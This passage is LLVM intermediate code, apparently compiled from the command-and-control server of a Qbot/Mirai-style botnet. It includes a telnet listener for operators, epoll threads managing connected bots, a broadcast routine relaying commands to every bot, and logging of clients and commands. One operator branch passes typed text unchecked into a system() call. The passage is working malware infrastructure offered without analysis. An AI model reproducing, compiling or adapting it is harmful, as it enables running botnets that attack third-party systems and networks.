  %281 = getelementptr inbounds i8, i8* %280, i64 1
  %282 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* nonnull %92, i64 20, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.29, i64 0, i64 0), i8* %281) #10
  call void @trim(i8* nonnull %92)
  br label %283

; <label>:283:                                    ; preds = %277, %301
  %indvars.iv173 = phi i64 [ 0, %277 ], [ %indvars.iv.next174, %301 ]
  %284 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %indvars.iv173, i32 2, i64 0
  %285 = call i8* @strstr(i8* %284, i8* nonnull %92) #9
  %286 = icmp eq i8* %285, null
  br i1 %286, label %301, label %287

; <label>:287:                                    ; preds = %283
  %288 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %17, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.82, i64 0, i64 0), i8* %85) #10
  %289 = call i64 @strlen(i8* nonnull %17) #9
  %290 = trunc i64 %indvars.iv173 to i32
  %291 = call i64 @send(i32 %290, i8* nonnull %17, i64 %289, i32 16384) #10
  %292 = icmp eq i64 %291, -1
  br i1 %292, label %.loopexit148.loopexit, label %293

; <label>:293:                                    ; preds = %287
  %294 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %indvars.iv173, i32 1
  store i32 0, i32* %294, align 4
  %295 = trunc i64 %indvars.iv173 to i32
  %296 = call i32 @close(i32 %295) #10
  %297 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %17, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.83, i64 0, i64 0), i8* nonnull %92) #10
  %298 = call i64 @strlen(i8* nonnull %17) #9
  %299 = call i64 @send(i32 %13, i8* nonnull %17, i64 %298, i32 16384) #10
  %300 = icmp eq i64 %299, -1
  br i1 %300, label %.loopexit148.loopexit, label %301

; <label>:301:                                    ; preds = %283, %293
  %indvars.iv.next174 = add nuw nsw i64 %indvars.iv173, 1
  %302 = icmp slt i64 %indvars.iv.next174, 1000000
  br i1 %302, label %283, label %.loopexit.loopexit

; <label>:303:                                    ; preds = %274
  %304 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.84, i64 0, i64 0)) #9
  %305 = icmp eq i8* %304, null
  br i1 %305, label %306, label %309

; <label>:306:                                    ; preds = %303
  %307 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.85, i64 0, i64 0)) #9
  %308 = icmp eq i8* %307, null
  br i1 %308, label %.loopexit, label %309

; <label>:309:                                    ; preds = %306, %303
  %310 = call i8* @strtok(i8* nonnull %16, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i64 0, i64 0)) #10
  %311 = call i64 @strlen(i8* %310) #9
  %312 = getelementptr inbounds i8, i8* %310, i64 %311
  %313 = getelementptr inbounds i8, i8* %312, i64 1
  %314 = call i32 @atoi(i8* %313) #9
  %315 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %17, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.82, i64 0, i64 0), i8* %85) #10
  %316 = call i64 @strlen(i8* nonnull %17) #9
  %317 = call i64 @send(i32 %314, i8* nonnull %17, i64 %316, i32 16384) #10
  %318 = icmp eq i64 %317, -1
  br i1 %318, label %.loopexit148.loopexit185, label %319

; <label>:319:                                    ; preds = %309
  %320 = sext i32 %314 to i64
  %321 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %320, i32 1
  store i32 0, i32* %321, align 4
  %322 = call i32 @close(i32 %314) #10
  %323 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %17, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.86, i64 0, i64 0), i32 %314) #10
  %324 = call i64 @strlen(i8* nonnull %17) #9
  %325 = call i64 @send(i32 %13, i8* nonnull %17, i64 %324, i32 16384) #10
  %326 = icmp eq i64 %325, -1
  br i1 %326, label %.loopexit148.loopexit185, label %.loopexit

; <label>:327:                                    ; preds = %268
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.87, i64 0, i64 0), i64 53, i32 1, i1 false)
  %328 = call i64 @strlen(i8* nonnull %17) #9
  %329 = call i64 @send(i32 %13, i8* nonnull %17, i64 %328, i32 16384) #10
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %301
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %306, %.loopexit149, %327, %319
  %330 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.88, i64 0, i64 0)) #9
  %331 = icmp eq i8* %330, null
  br i1 %331, label %354, label %332

; <label>:332:                                    ; preds = %.loopexit
  %333 = call i32 @strcmp(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.24, i64 0, i64 0), i8* %89) #9
  %334 = icmp eq i32 %333, 0
  br i1 %334, label %338, label %335

; <label>:335:                                    ; preds = %332
  %336 = call i32 @strcmp(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.25, i64 0, i64 0), i8* %89) #9
  %337 = icmp eq i32 %336, 0
  br i1 %337, label %338, label %351

; <label>:338:                                    ; preds = %335, %332
  %339 = call i8* @strtok(i8* nonnull %16, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i64 0, i64 0)) #10
  %340 = getelementptr inbounds i8, i8* %339, i64 8
  call void @trim(i8* %340)
  %341 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %90, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.89, i64 0, i64 0), i8* %340) #10
  %342 = call i32 @system(i8* nonnull %90) #10
  %343 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.90, i64 0, i64 0), i8* %52, i8* %340)
  %344 = call i64 @strlen(i8* nonnull %17) #9
  %345 = call i64 @send(i32 %13, i8* nonnull %17, i64 %344, i32 16384) #10
  %346 = icmp eq i64 %345, -1
  br i1 %346, label %.loopexit148.loopexit185, label %347

; <label>:347:                                    ; preds = %338
  %348 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  %349 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %348, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.90, i64 0, i64 0), i8* %52, i8* %340)
  %350 = call i32 @fclose(%struct._IO_FILE* %348)
  br label %354

; <label>:351:                                    ; preds = %335
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i64 0, i64 0), i64 41, i32 1, i1 false)
  %352 = call i64 @strlen(i8* nonnull %17) #9
  %353 = call i64 @send(i32 %13, i8* nonnull %17, i64 %352, i32 16384) #10
  br label %354

; <label>:354:                                    ; preds = %.loopexit, %347, %351
  %355 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.91, i64 0, i64 0)) #9
  %356 = icmp eq i8* %355, null
  br i1 %356, label %357, label %.loopexit151.loopexit184

; <label>:357:                                    ; preds = %354
  call void @trim(i8* nonnull %16)
  %358 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %77, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.37, i64 0, i64 0), i8* %52) #10
  %359 = call i64 @strlen(i8* nonnull %77) #9
  %360 = call i64 @send(i32 %13, i8* nonnull %77, i64 %359, i32 16384) #10
  %361 = icmp eq i64 %360, -1
  br i1 %361, label %.loopexit151.loopexit184, label %362

; <label>:362:                                    ; preds = %357
  %363 = call i64 @strlen(i8* nonnull %16) #9
  %364 = icmp eq i64 %363, 0
  br i1 %364, label %.backedge, label %365

; <label>:365:                                    ; preds = %362
  %366 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.92, i64 0, i64 0), i8* %52, i8* nonnull %16)
  %367 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.93, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  %368 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %367, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.92, i64 0, i64 0), i8* %52, i8* nonnull %16)
  %369 = call i32 @fclose(%struct._IO_FILE* %367)
  call void @broadcast(i8* nonnull %16, i32 %13, i8* nonnull %44)
  call void @llvm.memset.p0i8.i64(i8* nonnull %16, i8 0, i64 2048, i32 16, i1 false)
  br label %.backedge

.backedge:                                        ; preds = %365, %362
  %370 = call i32 @fdgets(i8* nonnull %16, i32 2048, i32 %13)
  %371 = icmp sgt i32 %370, 0
  br i1 %371, label %99, label %.loopexit151.loopexit184

.loopexit151.loopexit:                            ; preds = %121
  br label %.loopexit151

.loopexit151.loopexit184:                         ; preds = %354, %.backedge, %357, %232, %211, %130
  br label %.loopexit151

.loopexit151:                                     ; preds = %.loopexit151.loopexit184, %.loopexit151.loopexit, %82, %33, %76, %66, %69, %59, %55, %40, %36, %._crit_edge, %72
  %sext = shl i64 %12, 32
  %372 = ashr exact i64 %sext, 32
  %373 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %372, i32 1
  store i32 0, i32* %373, align 4
  %374 = call i32 @close(i32 %13) #10
  %375 = load volatile i32, i32* @managesConnected, align 4
  %376 = add nsw i32 %375, -1
  store volatile i32 %376, i32* @managesConnected, align 4
  br label %.loopexit148

.loopexit148.loopexit:                            ; preds = %287, %293
  br label %.loopexit148

.loopexit148.loopexit183:                         ; preds = %255
  br label %.loopexit148

.loopexit148.loopexit185:                         ; preds = %244, %309, %319, %338
  br label %.loopexit148

.loopexit148:                                     ; preds = %.loopexit148.loopexit185, %.loopexit148.loopexit183, %.loopexit148.loopexit, %.loopexit151
  ret i8* null
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE* nocapture) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @fgetc(%struct._IO_FILE* nocapture) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @rewind(%struct._IO_FILE* nocapture) local_unnamed_addr #4

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) local_unnamed_addr #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @snprintf(i8* nocapture, i64, i8* nocapture readonly, ...) local_unnamed_addr #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: noinline noreturn nounwind uwtable
define noalias nonnull i8* @telnetListener(i32) #6 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca { i64, i64 }, align 8
  %tmpcast = bitcast { i64, i64 }* %4 to %struct.sockaddr_in*
  %5 = alloca i64, align 8
  %6 = tail call i32 @socket(i32 2, i32 1, i32 0) #10
  %7 = icmp slt i32 %6, 0
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %1
  tail call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.94, i64 0, i64 0)) #12
  br label %9

; <label>:9:                                      ; preds = %8, %1
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 3, i64 0
  %11 = bitcast i8* %10 to i64*
  store i64 0, i64* %11, align 4
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %12, align 4
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2, i32 0
  store i32 0, i32* %13, align 4
  %14 = trunc i32 %0 to i16
  %15 = tail call zeroext i16 @htons(i16 zeroext %14) #11
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %15, i16* %16, align 2
  %17 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %18 = call i32 @bind(i32 %6, %struct.sockaddr* nonnull %17, i32 16) #10
  %19 = icmp slt i32 %18, 0
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %9
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.95, i64 0, i64 0)) #12
  br label %21

; <label>:21:                                     ; preds = %20, %9
  %22 = call i32 @listen(i32 %6, i32 5) #10
  store i32 16, i32* %2, align 4
  %23 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %4, i64 0, i32 0
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %tmpcast, i64 0, i32 2, i32 0
  %25 = bitcast { i64, i64 }* %4 to %struct.sockaddr*
  br label %26

; <label>:26:                                     ; preds = %42, %21
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.96, i64 0, i64 0))
  %28 = load i64, i64* %23, align 8
  call void @client_addr(i64 %28, i64 undef)
  %29 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  %30 = load i32, i32* %24, align 4
  %31 = and i32 %30, 255
  %32 = lshr i32 %30, 8
  %33 = and i32 %32, 255
  %34 = lshr i32 %30, 16
  %35 = and i32 %34, 255
  %36 = lshr i32 %30, 24
  %37 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %29, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.97, i64 0, i64 0), i32 %31, i32 %33, i32 %35, i32 %36)
  %38 = call i32 @fclose(%struct._IO_FILE* %29)
  %39 = call i32 @accept(i32 %6, %struct.sockaddr* nonnull %25, i32* nonnull %2) #10
  %40 = icmp slt i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %26
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.98, i64 0, i64 0)) #12
  br label %42

; <label>:42:                                     ; preds = %41, %26
  %43 = sext i32 %39 to i64
  %44 = inttoptr i64 %43 to i8*
  %45 = call i32 @pthread_create(i64* nonnull %5, %union.pthread_attr_t* null, i8* (i8*)* nonnull @telnetWorker, i8* %44) #10
  br label %26
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @listen(i32, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8** nocapture readonly, i8** nocapture readnone) local_unnamed_addr #0 {
  %4 = alloca %struct.epoll_event, align 4
  %5 = tail call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #10
  %6 = icmp eq i32 %0, 4
  br i1 %6, label %11, label %7

; <label>:7:                                      ; preds = %3
  %8 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %9 = load i8*, i8** %1, align 8
  %10 = tail call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %8, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.99, i64 0, i64 0), i8* %9) #12
  tail call void @exit(i32 1) #13
  unreachable

; <label>:11:                                     ; preds = %3
  %12 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.100, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.101, i64 0, i64 0))
  store %struct._IO_FILE* %12, %struct._IO_FILE** @fileFD, align 8
  %13 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.102, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.101, i64 0, i64 0))
  store %struct._IO_FILE* %13, %struct._IO_FILE** @kfileFD, align 8
  %14 = getelementptr inbounds i8*, i8** %1, i64 3
  %15 = load i8*, i8** %14, align 8
  %16 = tail call i32 @atoi(i8* %15) #9
  %17 = getelementptr inbounds i8*, i8** %1, i64 2
  %18 = load i8*, i8** %17, align 8
  %19 = tail call i32 @atoi(i8* %18) #9
  %20 = icmp sgt i32 %19, 850
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %11
  %puts = tail call i32 @puts(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @str, i64 0, i64 0))
  ret i32 0

; <label>:22:                                     ; preds = %11
  %23 = tail call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.104, i64 0, i64 0), i32 %16)
  %24 = getelementptr inbounds i8*, i8** %1, i64 1
  %25 = load i8*, i8** %24, align 8
  %26 = tail call fastcc i32 @create_and_bind(i8* %25)
  store volatile i32 %26, i32* @listenFD, align 4
  %27 = load volatile i32, i32* @listenFD, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  tail call void @abort() #13
  unreachable

; <label>:30:                                     ; preds = %22
  %31 = load volatile i32, i32* @listenFD, align 4
  %32 = tail call fastcc i32 @make_socket_non_blocking(i32 %31)
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %30
  tail call void @abort() #13
  unreachable

; <label>:35:                                     ; preds = %30
  %36 = load volatile i32, i32* @listenFD, align 4
  %37 = tail call i32 @listen(i32 %36, i32 128) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %40

; <label>:39:                                     ; preds = %35
  tail call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.105, i64 0, i64 0)) #12
  tail call void @abort() #13
  unreachable

; <label>:40:                                     ; preds = %35
  %41 = tail call i32 @epoll_create1(i32 0) #10
  store volatile i32 %41, i32* @epollFD, align 4
  %42 = load volatile i32, i32* @epollFD, align 4
  %43 = icmp eq i32 %42, -1
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %40
  tail call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.106, i64 0, i64 0)) #12
  tail call void @abort() #13
  unreachable

; <label>:45:                                     ; preds = %40
  %46 = load volatile i32, i32* @listenFD, align 4
  %47 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i64 0, i32 1
  %48 = bitcast %union.epoll_data* %47 to i32*
  store i32 %46, i32* %48, align 4
  %49 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i64 0, i32 0
  store i32 -2147483647, i32* %49, align 4
  %50 = load volatile i32, i32* @epollFD, align 4
  %51 = load volatile i32, i32* @listenFD, align 4
  %52 = call i32 @epoll_ctl(i32 %50, i32 1, i32 %51, %struct.epoll_event* nonnull %4) #10
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %55

; <label>:54:                                     ; preds = %45
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0)) #12
  call void @abort() #13
  unreachable

; <label>:55:                                     ; preds = %45
  %56 = add nsw i32 %19, 2
  %57 = zext i32 %56 to i64
  %58 = alloca i64, i64 %57, align 16
  %59 = icmp eq i32 %19, 0
  br i1 %59, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %55
  %60 = sext i32 %19 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %60, %.lr.ph.preheader ], [ %indvars.iv.next, %.lr.ph ]
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %61 = getelementptr inbounds i64, i64* %58, i64 %indvars.iv
  %62 = call i32 @pthread_create(i64* %61, %union.pthread_attr_t* null, i8* (i8*)* nonnull @epollEventLoop, i8* null) #10
  %63 = trunc i64 %indvars.iv.next to i32
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %55
  %65 = sext i32 %16 to i64
  %66 = inttoptr i64 %65 to i8*
  %67 = call i32 @pthread_create(i64* nonnull %58, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* %66) #10
  br label %68

; <label>:68:                                     ; preds = %68, %._crit_edge
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 -1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.107, i64 0, i64 0))
  %69 = call i32 @sleep(i32 60) #10
  br label %68
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @create_and_bind(i8*) unnamed_addr #0 {
  %2 = alloca %struct.addrinfo, align 8
  %3 = alloca %struct.addrinfo*, align 8
  %4 = alloca i32, align 4
  %5 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %2, i64 0, i32 2
  %6 = bitcast %struct.addrinfo* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %6, i8 0, i64 48, i32 8, i1 false)
  store i32 1, i32* %5, align 8
  %7 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %2, i64 0, i32 0
  store i32 1, i32* %7, align 8
  %8 = call i32 @getaddrinfo(i8* null, i8* %0, %struct.addrinfo* nonnull %2, %struct.addrinfo** nonnull %3) #10
  %9 = icmp eq i32 %8, 0
  br i1 %9, label %.preheader, label %12

.preheader:                                       ; preds = %1
  %.01719 = load %struct.addrinfo*, %struct.addrinfo** %3, align 8
  %10 = icmp eq %struct.addrinfo* %.01719, null
  br i1 %10, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %.preheader
  %11 = bitcast i32* %4 to i8*
  br label %16

; <label>:12:                                     ; preds = %1
  %13 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %14 = call i8* @gai_strerror(i32 %8) #10
  %15 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %13, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.109, i64 0, i64 0), i8* %14) #12
  br label %45

; <label>:16:                                     ; preds = %.lr.ph, %38
  %.01720 = phi %struct.addrinfo* [ %.01719, %.lr.ph ], [ %.017, %38 ]
  %17 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 1
  %18 = load i32, i32* %17, align 4
  %19 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 2
  %20 = load i32, i32* %19, align 8
  %21 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 3
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @socket(i32 %18, i32 %20, i32 %22) #10
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %38, label %25

; <label>:25:                                     ; preds = %16
  store i32 1, i32* %4, align 4
  %26 = call i32 @setsockopt(i32 %23, i32 1, i32 2, i8* nonnull %11, i32 4) #10
  %27 = icmp eq i32 %26, -1
  br i1 %27, label %28, label %29

; <label>:28:                                     ; preds = %25
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.110, i64 0, i64 0)) #12
  br label %29

; <label>:29:                                     ; preds = %28, %25
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 5
  %31 = load %struct.sockaddr*, %struct.sockaddr** %30, align 8
  %32 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 4
  %33 = load i32, i32* %32, align 8
  %34 = call i32 @bind(i32 %23, %struct.sockaddr* %31, i32 %33) #10
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %43, label %36

; <label>:36:                                     ; preds = %29
  %37 = call i32 @close(i32 %23) #10
  br label %38

; <label>:38:                                     ; preds = %16, %36
  %39 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 7
  %.017 = load %struct.addrinfo*, %struct.addrinfo** %39, align 8
  %40 = icmp eq %struct.addrinfo* %.017, null
  br i1 %40, label %._crit_edge.loopexit, label %16

._crit_edge.loopexit:                             ; preds = %38
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %41 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %42 = call i64 @fwrite(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.111, i64 0, i64 0), i64 15, i64 1, %struct._IO_FILE* %41) #12
  br label %45

; <label>:43:                                     ; preds = %29
  %44 = load %struct.addrinfo*, %struct.addrinfo** %3, align 8
  call void @freeaddrinfo(%struct.addrinfo* %44) #10
  br label %45

; <label>:45:                                     ; preds = %43, %._crit_edge, %12
  %.018 = phi i32 [ -1, %12 ], [ -1, %._crit_edge ], [ %23, %43 ]
  ret i32 %.018
}

; Function Attrs: noreturn nounwind
declare void @abort() local_unnamed_addr #8

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) local_unnamed_addr #4

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) local_unnamed_addr #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) local_unnamed_addr #4

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #9

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #9

; Function Attrs: nounwind
declare i32 @puts(i8* nocapture readonly) #10

; Function Attrs: nounwind
declare i64 @fwrite(i8* nocapture, i64, i64, %struct._IO_FILE* nocapture) #10

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
